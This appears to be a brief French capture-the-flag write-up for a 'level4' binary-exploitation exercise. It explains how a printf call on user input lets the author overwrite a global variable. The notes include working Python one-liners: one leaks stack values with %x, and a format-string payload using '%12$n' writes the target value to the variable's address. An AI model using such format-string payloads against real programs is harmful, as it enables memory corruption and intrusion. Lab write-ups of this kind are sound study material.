Meme chose que le flag3

on voit un programme qui a la fonction N et P
le main call uniquement N qui a un fgets ce qui empeche les buffer overflow attack
la fontion P a un printf donc on va faire comme le level3
on va encore une fois recuperer l'adresse de la variable M avec print &m et on a son adresse : 0x8049810 et juste apres il est compare avec $0x1025544
comme le level3 on va essayer de print notre adresse

python -c 'print "CCCC %x %x %x %x %x %x %x %x %x %x %x %x %x"' > /tmp/test

notre adresse est a la 12 eme position donc comme le level3 on met l'adresse de la variable m : \x10\x98\x04\x08

16930112d c'est le nombre a l'adresse 0x1025544 ce qui donne 16930116 en decimal il faut donc qu'on ecrive cette valeur en enlevent 4 car l'adresse fait 4 bytes

python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/test2

cat /tmp/test2 | ./level4